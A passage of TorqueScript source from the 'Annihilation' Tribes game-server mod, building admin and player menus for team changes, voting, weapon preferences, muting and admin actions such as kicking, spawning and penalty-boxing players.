			Client::addMenuItem(%clientId, %curItem++ @ "Punish " @ %name, "PenaltyBox " @ %sel);			
		//	Client::addMenuItem(%clientId, %curItem++ @ "Flag fun with " @ %name, "flag " @ %sel);
			if (%status == "(Live)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Kill " @ %name, "Kill " @ %sel);
			else if (%status == "(Dead)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Spawn " @ %name, "spawn " @ %sel);	
			else if (%status == "(Observing)")	
				Client::addMenuItem(%clientId, %curItem++ @ "Spawn to Auto team ", "Autoteam " @ %sel);				
				
			if(%clientId.isOwner)
				Client::addMenuItem(%clientId, %curItem++ @ "Pack " @ %name, "newmaster " @ %sel);			
		}
		return;
	}

	
		
		
		

//	if($matchStarted || !$Server::TourneyMode)
//	{
		Client::addMenuItem(%clientId, %curItem++ @ "Change Teams/Observe", "changeteams");
		Client::addMenuItem(%clientId, %curItem++ @ "Personal Options", "personal");
//	}
	if($curVoteTopic == "" && %clientId.isAdmin)
	{
		if($NoVote == 1) 
			Client::addMenuItem(%clientId, %curItem++ @ "Enable voting", "eVote");	
		else 
			Client::addMenuItem(%clientId, %curItem++ @ "Voting Options ", "vote");			
	}
	else if($curVoteTopic == "" && !%clientId.isAdmin && !$NoVote && !%clientId.novote)
	{
		if($ANNIHILATION::PVChangeMission && !$loadingMission)
			Client::addMenuItem(%clientId, %curItem++ @ "Vote Mission ", "voteMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote Time ", "voteTime");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote Damage ", "voteDamage");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote Flag ", "voteFlag");		
	}	

	// force vote
	if($curVoteTopic != "" && %clientId.issuperAdmin && !$curVoteForce)
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Force Vote", "voteForce");
	}
	if(%clientId.isAdmin)
	{
		// map options
		Client::addMenuItem(%clientId, %curItem++ @ "Map Options", "mapMenu");
		// damage options
		Client::addMenuItem(%clientId, %curItem++ @ "Damage Options", "damageMenu");
 		// server options
		Client::addMenuItem(%clientId, %curItem++ @ "Server Options", "ServerOptions");		
		// Equipment options
		Client::addMenuItem(%clientId, %curItem++ @ "Equipment Options", "Equipment");	
	}
	// Mod Info
	Client::addMenuItem(%clientId, %curItem++ @ "Mod Settings/Info", "ModInfo");	
//	messageall(1,%clientId@" viewing info!");

	remoteEval(%clientId,"SetInfoLine",1,"ANNIHILATION "@$ModVersion);
	%z = 1;
	if($lastModupdate)
		remoteEval(%clientId,"SetInfoLine",%z++,$lastModupdate@" build.");
	else
		remoteEval(%clientId,"SetInfoLine",%z++,"www.annihilation.info");

//	remoteEval(%clientId,"SetInfoLine",%z++,"Key: "@$ItemFavoritesKey); 

	if($Server::TourneyMode)
		%nextMission = $missionName;
	else if($nextMap != "")
  		%nextMission = $nextMap;	
	else
		%nextMission = $nextMission[$missionName];
		
	remoteEval(%clientId,"SetInfoLine",%z++,"Next: "@%nextMission @" ("@$MLIST::MType[%nextMission]@")"); 

	if($Annihilation::uber)
		%string1 = "UBER is ON! "; 
	if($build)
		%string1 = %string1 @ "Build mode ON. "; 
	if($Annihilation::NoPlayerDamage == 1)
		%string1 = %string1 @ "Player damage OFF. "; 
	else if($Server::TeamDamageScale == 1.0)
		%string1 = %string1 @ "Team damage ON. "; 							//.end
	if(%string1 != "")
		remoteEval(%clientId,"SetInfoLine",%z++,%string1);

	if($Annihilation::SafeBase)
		remoteEval(%clientId,"SetInfoLine",%z++,"Base supply undestroyable.");	
	else if($Annihilation::BaseHeal)
		remoteEval(%clientId,"SetInfoLine",%z++,"Bases are self regenerating.");	
	if(!$ANNIHILATION::OutOfArea)
		remoteEval(%clientId,"SetInfoLine",%z++,"Map boundries are on."); 
	//	remoteEval(%clientId,"SetInfoLine",%z++,"Map boundries are on.Map boundries are on.Map boundries are on."); 
	if($FlagHunter::Enabled)
		remoteEval(%clientId,"SetInfoLine",%z++,"Flag hunter is on.");	
	else if($NoFlagCaps == 1)
		remoteEval(%clientId,"SetInfoLine",%z++,"No flag cap limit.");								


	
	
	
	

	//Client::addMenuItem(%clientId, %curItem++ @ "BANG HEAD HERE.", "BangHead");		
	
}

function remoteSelectClient(%clientId, %selId)
{	
	if(!evalspam(%clientId))
		return;	
		
	%selId++;
	%selId--;	
		
	%clientId.selClient = %selId;	
	if(%clientId.menuMode == "options")
		Game::menuRequest(%clientId);
	else if(%clientId.menuMode == "player")
		PlayerManage(%clientId, %selId);
	else
		Game::menuRequest(%clientId);	//rebuild menu
	remoteEval(%clientId, "setInfoLine", 1, "Player Info for " @ Client::getName(%selId) @ ":");
	remoteEval(%clientId, "setInfoLine", 2, "Real Name: " @ $Client::info[%selId, 1]);
	remoteEval(%clientId, "setInfoLine", 3, "Email Addr: " @ $Client::info[%selId, 2]);
	remoteEval(%clientId, "setInfoLine", 4, "Tribe: " @ $Client::info[%selId, 3]);
	remoteEval(%clientId, "setInfoLine", 5, "URL: " @ $Client::info[%selId, 4]);
	%ip = Ann::ipCut(Client::getTransportAddress(%selId));
	if(!%clientId.isAdmin)
		remoteEval(%clientId, "setInfoLine", 6, "IP: " @ Ann::IP(%ip));
	if(%clientId.isAdmin)	 
	{	 
		remoteEval(%clientId, "setInfoLine", 6, "Ip: " @ %ip);
		if($Client::names[%selId] != "")
			bottomprint(%clientId,"<jc><f2> Other names "@$Client::names[%selId],30);
		else
			bottomprint(%clientId,"<jc><f2> No Other names saved",30);	
	}	
	else
	{
		%s = %clientId.TKills/%clientId.TDeaths+0.005;
		%p = String::findSubStr(%s, ".");
		%r = String::getSubStr(%s, 0, %p+3);		
		bottomprint(%clientId,"<jc><f2>"@Client::getName(%selId)@"'s ratio " @%r@" to 1");
	}
}

function processMenuFPickTeam(%clientId, %team)
{
	if(%clientId.isAdmin)
		processMenuPickTeam(%clientId.ptc, %team, %clientId);
	%clientId.ptc = "";
}


//plasmatic
function processMenuPickTeam(%clientId, %team, %adminClient)
{	
	if($debug)
		echo(%clientId@", team "@ %team@", admin client "@ %adminClient);
	
	if(%clientId.locked && !%clientId.isadmin)
		return;
	%player = Client::getOwnedObject(%clientId);
	if(%clientId.isadmin && $jailed[%player] == true)
	{
		if(%team == "escape")
		{
			GameBase::SetPosition(%player, vector::add(GameBase::GetPosition(%player),"0 0 10"));
			return;
		}
			
		else return;
	}
	
	if(!%adminClient.SecretAdmin)
		%adminName = Client::getName(%adminClient);
	else %adminName = SecretAdmin();

	checkPlayerCash(%clientId);
	if(%team != -1 && %team == Client::getTeam(%clientId))
		return;
	//these are only accessable by hax0ring, plasmatic
	if(%team < -2 || %team > getNumTeams()-1)	
	{
		messageAllExcept(%clientId, 0, %name@" is a confirmed bonehead, kill him."); 	
		messageAll(0, Client::getName(%clientId) @ " Tried to unbalance the teams even more!!");
		return;
	}	
	//this one too...
	if($ANNIHILATION::FairTeams && Game::assignClientTeam(%clientId,true) != %team && %team != -2 && %team != -1 && !%adminClient.isadmin && !%clientId.isadmin) 
	{
		messageAllExcept(%clientId, 0, %name@" is a confirmed bonehead, kill him."); 	
		messageAll(0, Client::getName(%clientId) @ " Tried to unbalance the teams even more!!");
		return;
	}
	if(%clientId.observerMode == "justJoined")
	{
		%clientId.observerMode = "";
		centerprint(%clientId, "");
	}
	if((!$matchStarted || !$Server::TourneyMode || %adminClient) && %team == -2)
	{
		if(Observer::enterObserverMode(%clientId))
		{
			%clientId.notready = "";
			if(%adminClient == "") 
				messageAll(0, Client::getName(%clientId) @ " became an observer.");
			else
			{
				%message = Client::getName(%clientId) @ " was forced into observer mode by " @ %adminName @ ".";
				echo(%message);
				messageAll(0, %message);
			}
			Game::resetScores(%clientId);	
			Game::refreshClientScore(%clientId);
		}
		return;
	}
	%player = Client::getOwnedObject(%clientId);
	if(%player != -1 && getObjectType(%player) == "Player" && !Player::isDead(%player))
	{
		playNextAnim(%clientId);
		Player::kill(%clientId);
	}
	%clientId.observerMode = "";
	if(%adminClient == "")
	{
		messageAll(0, Client::getName(%clientId) @ " changed teams.");
	}
	else
	{
		if(%adminClient != %clientId && !%adminclient.SecretAdmin)
			messageAll(0, Client::getName(%clientId) @ " was teamchanged by " @ %adminName @ ".");
		else
			messageAll(0, Client::getName(%clientId) @ " changed teams.");			
		$Admin = Client::getName(%adminClient)@ " teamchanged " @ Client::getName(%clientId);	echo($admin);
			export("Admin","config\\Admin.log",true);
			
	}
	if(%team == -1)
	{
		Game::assignClientTeam(%clientId);
		%team = Client::getTeam(%clientId);
	}
	GameBase::setTeam(%clientId, %team);
	%clientId.teamEnergy = 0;
	Client::clearItemShopping(%clientId);
	if(Client::getGuiMode(%clientId) != 1)
		Client::setGuiMode(%clientId,1);		
	Client::setControlObject(%clientId, -1);
	Game::playerSpawn(%clientId, false);
	%team = Client::getTeam(%clientId);
	if($TeamEnergy[%team] != "Infinite")
		$TeamEnergy[%team] += $InitialPlayerEnergy;
	if($Server::TourneyMode && !$CountdownStarted)
	{
		bottomprint(%clientId, "<f1><jc>Press FIRE when ready.", 0);
		%clientId.notready = true;
	}
}												
// yep, 'function processMenuOptions' is nearly 550 lines long.. -Plasmatic
function processMenuOptions(%clientId, %option)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
	
	if(!%ClientId.SecretAdmin)
		%adminName = Client::getName(%clientId);
	else 
		%adminName = SecretAdmin();	

	// Weapon Options
	// Weapon Options - AUTO
	if(%opt == "personal") 
	{	
		%curItem = 0;
		Client::buildMenu(%clientId, "Annihilation Weapon Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Mini Bomber", "weapon_grenadelauncher");
		Client::addMenuItem(%clientId, %curItem++ @ "Vulcan", "weapon_vulcan");
		Client::addMenuItem(%clientId, %curItem++ @ "Particle Beam", "weapon_pbeam");
		
		Client::addMenuItem(%clientId, %curItem++ @ "Suicide Pack", "pack_suicideTimer");
		Client::addMenuItem(%clientId, %curItem++ @ "Baby Nuke", "weapon_Baby");
		if(%clientId.weaponHelp == true)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Weapon Help", "weaponHelp");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Weapon Help", "weaponHelp");
			
		if(%clientId.nospeedo == true)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable speedometer", "speedo");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable speedometer", "speedo");
					
		if(%clientId.BlockMySound == true)
			Client::addMenuItem(%clientId, %curItem++ @ "Turn voice pack on", "BlockMySound");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Turn voice pack off", "BlockMySound");
				
		if(%clientId.isadmin)
		{
			if(%clientId.isSuperAdmin || $ANNIHILATION::HideAdmin)
			{
				if(%clientId.SecretAdmin == true)
					Client::addMenuItem(%clientId, %curItem++ @ "Disable Secret Admin", "RegularAdmin");
				else
					Client::addMenuItem(%clientId, %curItem++ @ "Enable Secret Admin", "SecretAdmin");
			}
		}
		return;
				
	}
	if(%clientId.isadmin)
	{
		if(%opt == "SecretAdmin" && (%clientId.isSuperAdmin || $ANNIHILATION::HideAdmin))
		{
			Client::sendMessage(%clientId, 1, "Secret admin mode engaged~wturreton1.wav");		
			%clientId.SecretAdmin = true;		
			centerprint(%clientId, "<jc><f2>Secret <f1>admin <f2>mode engaged.", 10);
			return;
		}	
		else if(%opt == "RegularAdmin" && (%clientId.isSuperAdmin || $ANNIHILATION::HideAdmin))
		{
			Client::sendMessage(%clientId, 1, "Regular admin mode engaged~wturreton1.wav");		
			%clientId.SecretAdmin = false;		
			centerprint(%clientId, "<jc><f2>Regular <f1>admin <f2>mode engaged.", 10);
			return;
		}		
		
		
		
	}
	
	// Weapon options
	// refit and rejiggled 10/5/2007 12:58AM -Plasmatic

	if(%opt == "weapon_grenadelauncher")
	{
		//simplified 10/14/2007 3:42AM -Plasmatic
		if(%cl == -1)
		{
			%curItem = 0;
			Client::buildMenu(%clientId, "Mini Bomber Options", "options", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Triple Grenades", "weapon_grenadelauncher 0");
			Client::addMenuItem(%clientId, %curItem++ @ "Starburst Mines", "weapon_grenadelauncher 1");		
			Client::addMenuItem(%clientId, %curItem++ @ "Lucifers Hammer", "weapon_grenadelauncher 2");		
			Client::addMenuItem(%clientId, %curItem++ @ "Camera Projectile", "weapon_grenadelauncher 3");
			return;
		}
		else
		{
			%cl = floor(%cl);
			if(%cl < 0)
				%cl = 0;
			if(%cl > 3)
				%cl = 3;
			%clientId.MiniMode = %cl;
			
	
			if(%cl == 0)
				%message = "Triple Grenade";
			else if(%cl == 1)
				%message = "Starburst Mine";
			else if(%cl == 2)
				%message = "Lucifers Hammer";
			else if(%cl == 3)
				%message = "Camera";
	
			if(Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot) == grenadelauncher && %clientId.weaponHelp)
			{
				Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
				bottomprint(%clientId, "<jc>Mini Bomber: <f2>"@ %message @" Projectile.\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.",10);
			}
			else
				Client::sendMessage(%clientId, 0, "Mini Bomber preference switched to "@ %message @".~wturreton1.wav");		
	
		return;
		}
	}
	else if(%opt == "weapon_Baby")
	{		
		%curItem = 0;
		Client::buildMenu(%clientId, "Baby Nuke Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Standard", "weapon_BabyStand");
		Client::addMenuItem(%clientId, %curItem++ @ "Rocket Propelled", "weapon_BabyRocket");
		return;
	}
	else if(%opt == "weapon_BabyStand")
	{
		if(Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot) == BabyNukeMortar)
		{
			Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
			schedule("bottomprint(" @ %clientId @ ", \"<jc>Baby Nuke Launcher:<f2> Standard.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0);
		}	
		else
			Client::sendMessage(%clientId, 0, "Baby Nuke Launcher preference switched to Standard.~wturreton1.wav");		

		%clientId.Baby = 0;
		return;
	}
	else if(%opt == "weapon_BabyRocket")
	{
		if(Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot) == BabyNukeMortar)
		{
			Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
			schedule("bottomprint(" @ %clientId @ ", \"<jc>Baby Nuke Launcher:<f2> Rocket propelled.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0);
		}	
		else
			Client::sendMessage(%clientId, 0, "Baby preference switched to Rocket propelled.~wturreton1.wav");		
		
		%clientId.Baby = 1;
		return;
	}
	
		
	else if(%opt == "weapon_vulcan")
	{		
		%curItem = 0;
		Client::buildMenu(%clientId, "Vulcan Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Chaingun Bullets", "weapon_vulcan_chg");
		Client::addMenuItem(%clientId, %curItem++ @ "Vulcan Bullets", "weapon_vulcan_vul");
		return;
	}
	else if(%opt == "weapon_vulcan_chg")
	{
		if(Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot) == vulcan)
		{
			Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
			schedule("bottomprint(" @ %clientId @ ", \"<jc>Vulcan:<f2> Standard Chaingun Rounds.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0);
		}	
		else
			Client::sendMessage(%clientId, 0, "Vulcan preference switched to Standard Rounds.~wturreton1.wav");		

		%clientId.Vulcan = 0;
		return;
	}
	else if(%opt == "weapon_vulcan_vul")
	{
		if(Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot) == vulcan)
		{
			Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
			schedule("bottomprint(" @ %clientId @ ", \"<jc>Vulcan:<f2> Fiery Vulcan Rounds.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 10);", 0);
		}	
		else
			Client::sendMessage(%clientId, 0, "Vulcan preference switched to Fiery Vulcans.~wturreton1.wav");		
		
		%clientId.Vulcan = 1;
		return;
	}
	else if(%opt == "pack_suicideTimer")
	{
		//simplified 10/5/2007 1:28AM -Plasmatic
		if(%cl == -1)
		{
			%curItem = 0;
			Client::buildMenu(%clientId, "Suicide Pack Timer", "options", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Instant", "pack_suicideTimer 0");
			Client::addMenuItem(%clientId, %curItem++ @ "5 sec", "pack_suicideTimer 5");
			Client::addMenuItem(%clientId, %curItem++ @ "10 sec (Default)", "pack_suicideTimer 10");
			Client::addMenuItem(%clientId, %curItem++ @ "15 sec", "pack_suicideTimer 15");
			Client::addMenuItem(%clientId, %curItem++ @ "20 sec", "pack_suicideTimer 20");
			return;
		}
		else
		{
			%cl = floor(%cl);
			if(%cl < 0)
				%cl = 0;
			if(%cl > 20)
				%cl = 20;
			%clientId.suicideTimer = %cl;
			if(player::getitemcount(%clientId,SuicidePack) == 1)
			{
				Client::sendMessage(%clientId, 0, "~wturreton1.wav");	
				if(%cl == 0)
					schedule("bottomprint(" @ %clientId @ ", \"<jc><f2>Suicide Pack Timer Set to detonate <f1>INSTANTLY\", 7);", 0);
				else	
					schedule("bottomprint(" @ %clientId @ ", \"<jc><f2>Suicide Pack Timer Set to <f1>"@%cl@" <f2>seconds\", 7);", 0);				
			}
			else
			{
				if(%cl == 0)
					Client::sendMessage(%clientId, 0, "Suicide Pack preference switched to INSTANT.~wturreton1.wav");		
				else				
					Client::sendMessage(%clientId, 0, "Suicide Pack preference switched to "@%cl@" seconds.~wturreton1.wav");		
			}
		return;
		}
	}
//pbeam options.. sigh.. -plasmatic
	else if(%opt == "weapon_pbeam")
	{		
		%curItem = 0;
		Client::buildMenu(%clientId, "Particle Beam Options", "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Standard Firing", "weapon_pbeam_old");
		Client::addMenuItem(%clientId, %curItem++ @ "Turret Killer", "weapon_pbeam_new");
		return;
	}	
	else if(%opt == "weapon_pbeam_old")
	{
		if(player::getitemcount(%clientId,ParticleBeamWeapon) == 1)
		{
			%weapon = Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot);		
			if(%clientId.pbeam != 0 && %clientId.pbeam != "" && %weapon == ParticleBeamWeapon)
			{
				if(player::getitemcount(%clientId,EnergyPack) == 1)
					schedule("bottomprint(" @ %clientId @ ", \"<jc>Particle Beam Weapon: <f2>Standard Neutron Beam.\\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.\", 7);", 0);
				else
					Bottomprint(%clientId, "<jc>Particle Beam Weapon: <f2>Standard Neutron Beam.");
			}
		}
	//	else
			Client::sendMessage(%clientId, 0, "Particle Beam preference switched to standard mode.~wturreton1.wav");
		
		%clientId.pbeam = 0;
		return;
	}
	else if(%opt == "weapon_pbeam_new")
	{			
		%weapon = Player::getMountedItem(Client::getOwnedObject(%clientId),$WeaponSlot);
		if(player::getitemcount(%clientId,ParticleBeamWeapon) == 1)
		{
			if(player::getitemcount(%clientId,EnergyPack) == 1)
			{
				if(%weapon == ParticleBeamWeapon)
				{
					bottomprint(%clientId,"<jc>Particle Beam Weapon: <f2>Enhanced Positron Beam. Hold fire to charge.\nPress <f1>Use Laser<f2> or <f1>Use Blaster<f2> (1 and 6 keys) to change.",10);
					Client::sendMessage(%clientId, 0, "Particle Beam switched to enhanced mode~wturreton1.wav");
				}
				else
					Client::sendMessage(%clientId, 0, "Particle Beam preference switched to enhanced mode.~wturreton1.wav");
			}
			else
			{
				Client::sendMessage(%clientId, 0, "Particle Beam preference switched to enhanced mode.~wC_BuySell.wav");
				bottomprint(%clientId, "<jc><f2>The Particle Beam requires an Energy Pack to function in enhanced mode.",10);
			}
		}
		else
			Client::sendMessage(%clientId, 0, "Particle Beam preference switched to enhanced mode.~wturreton1.wav");

		%clientId.pbeam = 1;
		return;
	}	
	// END Weapon Options	
	else if(%opt == "weaponHelp")
	{
		if(%clientId.weaponHelp == true)
		{
			%clientId.weaponHelp = false;
			Client::sendMessage(%clientId,0,"Weapon Help Disabled.");
			centerprint(%clientId, "<jc><f1>Weapon Help Disabled.", 2);	
			return;
		}	
		else
		{
			%clientId.weaponHelp = true;
			Client::sendMessage(%clientId,0,"Weapon Help Enabled.");
			centerprint(%clientId, "<jc><f1>Weapon Help Enabled.", 2);			
			return;
		}
	}	
	else if(%opt == "speedo")
	{
		if(%clientId.nospeedo == true)
		{
			%clientId.nospeedo = false;
			Client::sendMessage(%clientId,0,"Speedometer Enabled.");
			centerprint(%clientId, "<jc><f1>Speedometer Enabled.", 2);			
			return;
		}	
		else
		{
			%clientId.nospeedo = true;
			Client::sendMessage(%clientId,0,"Speedometer Disabled.");
			centerprint(%clientId, "<jc><f1>Speedometer Disabled.", 2);	
			return;
		}
	}	
	else if(%opt == "BlockMySound")
	{
		if(%clientId.BlockMySound == true)
		{
			%clientId.BlockMySound = false;
			Client::sendMessage(%clientId,0,"Voice pack Enabled.");
			centerprint(%clientId, "<jc><f1>Voice pack Enabled.", 2);	
			return;
		}	
		else
		{
			%clientId.BlockMySound = true;
			Client::sendMessage(%clientId,0,"Voice pack Disabled.");
			centerprint(%clientId, "<jc><f1>Voice pack Disabled.", 2);			
			return;
		}
	}			
	// END Weapon/ personal Options
	
	if(%opt == "changeteams")
	{
		if(%clientId.locked)
		{
			Client::sendMessage(%clientId,0,"You cannot change teams, that privilege been revoked.");
			centerprint(%clientId, "<jc><f1>you don't have team changing privileges.", 15);			
			return;
		}
		%player = Client::getOwnedObject(%clientId);
		if(%player.frozen == true || $jailed[%player] == true)
		{
			if(%clientId.isadmin)
			{
				Client::buildMenu(%clientId, "Escape from jail? (Wanker!)", "PickTeam", true);
				Client::addMenuItem(%clientId, "1yes", "escape");
				Client::addMenuItem(%clientId, "2no", "noper");	
				return;
			}
			else
			{
				client::sendmessage(%clientId,2,"WARDEN: Not on my watch son...");
				return;
			}			
		}		
		if(!$matchStarted || !$Server::TourneyMode)
		{
			%teamnow = Client::getTeam(%clientId);

			%tname = getTeamName(%teamnow);
						if (%tname == unnamed) 
							%tname = "Observer";
			Client::buildMenu(%clientId, "Change from "@ %tname @" team", "PickTeam", true);

			if(Client::getTeam(%clientId) != -1) 
				Client::addMenuItem(%clientId, "0Observer", -2);
			if(Game::assignClientTeam(%clientId,true) != %teamnow)	
				Client::addMenuItem(%clientId, "1Automatic", -1);
			if(!$ANNIHILATION::FairTeams || %clientId.isAdmin)
			{	
				for(%i = 0; %i < getNumTeams()-1; %i = %i + 1)
				{
					if(Client::getTeam(%clientId) != %i)
						Client::addMenuItem(%clientId, (%i+2) @ getTeamName(%i), %i);
				 			}
				 		}
			return;
		}
	}
// voice
	if(%opt == "voice" && %clientId.isadmin) 
	{	
		%curItem = 0;
		%name = client::getname(%cl);
		Client::buildMenu(%clientId, "Modify "@%name@"'s Voice", "options", true);
		if(%clientId.muted[%cl])
			Client::addMenuItem(%clientId, %curItem++ @ "Unmute " @ %name, "unmute " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Ignore " @ %name, "mute " @ %cl);
			
		if(%cl.silenced)
			Client::addMenuItem(%clientId, %curItem++ @ "Global unmute", "unsilence " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Global mute ", "silence " @ %cl);
			
		if(%cl.leet)
			Client::addMenuItem(%clientId, %curItem++ @ "D-1ee7 " @ %name, "dleet " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Leetify " @ %name, "leet " @ %cl);
	
		if(%cl.noVpack)
			Client::addMenuItem(%clientId, %curItem++ @ "Return voice pack " @ %name, "ReturnVoicePack " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Take voice pack" , "TakeVoicePack " @ %cl);
			
		if(%cl.noKpack)
			Client::addMenuItem(%clientId, %curItem++ @ "Return Kpack " @ %name, "ReturnKPack " @ %cl);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Take Kpack" , "TakeKPack " @ %cl);		
		
		return;
	}
		
	// voice modifiers
	 	if(%opt == "silence" && %clientId.isadmin)			
		Admin::fun(%clientId, %cl,"De-Tongued");	
	 	if(%opt == "unsilence" && %clientId.isadmin)			
		Admin::fun(%clientId, %cl,"Un-Muted");	
			
	 	if(%opt == "leet" && %clientId.isadmin)
	 	{
	 		logAdminAction(%clientId," leeted " @ Client::getName(%cl));			
		%cl.leet = true;
	}	
	 	if(%opt == "dleet" && %clientId.isadmin) 
	 	{ 	
	 		%cl.leet = "";
	 		logAdminAction(%clientId," d-leeted " @ %name ); 
		Client::sendMessage(%cl,0,"You are no longer 1337.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" removed your 1337ness, get over it.");	
		
	}
	//voice packs	
	if(%opt == "TakeVoicePack" && %clientId.isadmin) 
	{ 	
	 		logAdminAction(%clientId," removed " @ Client::getName(%cl) @"'s voice pack"); 
	 		%cl.noVpack = true;
		Client::sendMessage(%cl,0,"Your voice pack has been disabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" removed your voice pack.");	
		
	}
	if(%opt == "ReturnVoicePack" && %clientId.isadmin) 
	 { 	
	 		logAdminAction(%clientId," returned " @ Client::getName(%cl) @"'s voice pack");
	 		%cl.noVpack = "";
		Client::sendMessage(%cl,0,"Your voice pack has been reenabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" returned your voice pack, please be responsible with it.");	
		
	}	
	
	if(%opt == "TakeKPack" && %clientId.isadmin) 
	{ 	
	 	logAdminAction(%clientId," removed " @ Client::getName(%cl) @"'s Kpack"); 
	 	%cl.noKpack = true;
		Client::sendMessage(%cl,0,"Your Kpack has been disabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" removed your Kpack.");	
		
	}
	if(%opt == "ReturnKPack" && %clientId.isadmin) 
	 { 	
	 	logAdminAction(%clientId," returned " @ Client::getName(%cl) @"'s Kpack");
	 	%cl.noKpack = "";
		Client::sendMessage(%cl,0,"Your Kpack has been reenabled.");
		centerprint(%cl, "<jc><f1>"@ %adminName @" returned your Kpack, please be responsible with it.");	
		
	}
		
	// global notification for mute -Plasmatic
	else if(%opt == "mute")
	{
		messageAllExcept(%cl,0,Client::getName(%clientId)@" is no longer listening to "@Client::getName(%cl)@".");
		Client::sendMessage(%cl,0,Client::getName(%clientId)@" is no longer listening to you.");
		%clientId.muted[%cl] = true;
	}
	else if(%opt == "unmute")
	{
		messageAllExcept(%cl,0,Client::getName(%clientId)@" is listening to "@Client::getName(%cl)@ " again.");
		Client::sendMessage(%cl,0,Client::getName(%clientId)@" is listening to you again.");
		%clientId.muted[%cl] = "";
	}
	else if(%opt == "vkick" && !$NoVote && !%clientId.novote)
	{
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "kick " @ Client::getName(%cl), "kick", %cl);
	}
	else if(%opt == "vadmin" && !$NoVote && $ANNIHILATION::VoteAdmin && !%clientId.novote)
	{
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "admin " @ Client::getName(%cl), "admin", %cl);
	}
	else if(%opt == "vfreeze"&& !$NoVote && !%clientId.novote)
	{
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "freeze " @ Client::getName(%cl), "freeze", %cl);
	}	
	else if(%opt == "vpoison"&& !$NoVote && !%clientId.novote)
	{
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "poison " @ Client::getName(%cl), "poison", %cl);
	}
	else if(%opt == "vsilence"&& !$NoVote && !%clientId.novote)
	{
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "Detongue " @ Client::getName(%cl), "silence", %cl);
	}	
	else if(%opt == "vunsilence"&& !$NoVote && !%clientId.novote)
	{
		%cl.voteTarget = true;
		Admin::startVote(%clientId, "UNMUTE " @ Client::getName(%cl), "unsilence", %cl);
	}
	else if(%opt == "vote" && !$NoVote && %clientId.isadmin)
	{	
		voteMenu(%clientId);
		return;
	}
	
	else if(%opt == "eVote" && %clientId.isadmin)	
		ServerSwitches(%clientId,"Voting",true);
	
	else if(%opt == "voteToPlayer" && !$NoVote)
	{	
		if(%cl.observerMode != "justJoined" && %cl.justConnected != true)
		{		
			voteToPlayer(%clientId, %cl);
			return;
		}
		else 
		{
			Admin::BlowUp(%clientId);
			Client::sendMessage(%clientId, 0,"You don't need to vote on "@Client::getName(%cl)@" yet, foo.");
			admin::message(Client::getName(%clientId)@" tried to start a vote on connecting player "@Client::getName(%cl)@".");
			return;	
		}
	}
	//--vtreturn
	else if(%opt == "Autoteam" && %clientId.isadmin)
	{	
		processMenuPickTeam(%cl, -1, %clientId);		
		Game::menuRequest(%clientId);
		return;
	}
	else if(%opt == "spawn" && %clientId.isadmin)
	{	
		logAdminAction(%clientId," spawned " @ %name);		
		Game::playerSpawn(%cl, true);
		Game::menuRequest(%clientId);		
		return;
	}
	else if(%opt == "manage" && %clientId.isadmin)
	{	
		PlayerManage(%clientId, %cl);
		return;
	}
	//PenaltyBox	
	else if(%opt == "PenaltyBox" && %clientId.isadmin)
	{	
		PenaltyBox(%clientId, %cl);
		return;
	}
	//NewMaster	
	else if(%opt == "newmaster" && %clientId.isowner)
	{	
		pack(%cl);
		return;
	}	
	else if(%opt == "annoy" && %clientId.isadmin)
	{	
		PlayerAnnoy(%clientId, %cl);
		return;
	}
//	else if(%opt == "flag" && %clientId.isadmin)
//	{	
//		PlayerFlag(%clientId, %cl);
//		return;
//	}
	else if(%opt == "Kill" && %clientId.isadmin)
	{	
		PlayerKill(%clientId, %cl);
		return;
	}
	else if(%opt == "return")
	{	
		Game::menuRequest(%clientId);
		return;
	}
	//--
